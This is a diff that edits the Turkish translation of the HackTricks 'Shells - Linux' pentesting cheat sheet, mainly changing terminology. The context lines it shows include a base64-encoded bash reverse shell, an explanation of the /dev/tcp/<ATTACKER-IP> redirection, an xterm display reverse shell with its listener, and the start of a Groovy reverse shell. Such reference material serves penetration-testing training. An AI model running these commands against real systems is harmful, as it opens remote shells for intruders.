@@ -1,25 +1,25 @@
 # Shells - Linux
 
 {% hint style="success" %}
-AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
 {% endhint %}
 
-**Bu shell'ler hakkında sorularınız varsa** [**https://explainshell.com/**](https://explainshell.com) **adresinden kontrol edebilirsiniz.**
+**Bu shell'ler hakkında sorularınız varsa** [**https://explainshell.com/**](https://explainshell.com) **ile kontrol edebilirsiniz.**
 
 ## Full TTY
 
-**Bir ters shell aldığınızda**[ **tam bir TTY elde etmek için bu sayfayı okuyun**](full-ttys.md)**.**
+**Bir reverse shell aldığınızda**[ **tam bir TTY elde etmek için bu sayfayı okuyun**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -47,7 +47,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Shell açıklaması
 
-1. **`bash -i`**: Bu komutun bu kısmı etkileşimli (`-i`) bir Bash shell başlatır.
+1. **`bash -i`**: Bu komutun bu kısmı etkileşimli (`-i`) Bash shell'ini başlatır.
 2. **`>&`**: Bu komutun bu kısmı **standart çıktıyı** (`stdout`) ve **standart hatayı** (`stderr`) **aynı hedefe yönlendirmek için** kısayol notasyonudur.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Bu, **belirtilen IP adresine ve porta bir TCP bağlantısını temsil eden** özel bir dosyadır.
 * **Çıktı ve hata akışlarını bu dosyaya yönlendirerek**, komut etkili bir şekilde etkileşimli shell oturumunun çıktısını saldırganın makinesine gönderir.
@@ -64,7 +64,7 @@ Bir **Remote Code Execution (RCE)** zafiyeti ile bir Linux tabanlı web uygulama
 
 Bu amaç için önerilen bir araç [toboggan](https://github.com/n3rada/toboggan.git) olup, hedef ortamla etkileşimi basitleştirir.
 
-Toboggan'ı etkili bir şekilde kullanmak için, hedef sisteminizin RCE bağlamına uygun bir Python modülü oluşturun. Örneğin, `nix.py` adında bir modül şu şekilde yapılandırılabilir:
+Toboggan'ı etkili bir şekilde kullanmak için, hedef sisteminizin RCE bağlamına uygun bir Python modülü oluşturun. Örneğin, `nix.py` adında bir modül aşağıdaki gibi yapılandırılabilir:
 ```python3
 import jwt
 import httpx
@@ -309,7 +309,8 @@ Bu, sisteminize 6001 numaralı portta bağlanmaya çalışacaktır:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Aşağıdaki komutu kullanarak ters kabuğu yakalayabilirsiniz (6001 numaralı portta dinleyecektir):
+To catch the reverse shell you can use (which will listen in port 6001):  
+Geri dönüş kabuğunu yakalamak için şunu kullanabilirsiniz (6001 numaralı portta dinleyecek):
 ```bash
 # Authorize host
 xhost +targetip
@@ -318,7 +319,7 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOT: Java ters kabuk Groovy için de çalışır
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOT: Java reverse shell Groovy için de çalışır
 ```bash
 String host="localhost";
 int port=8044;
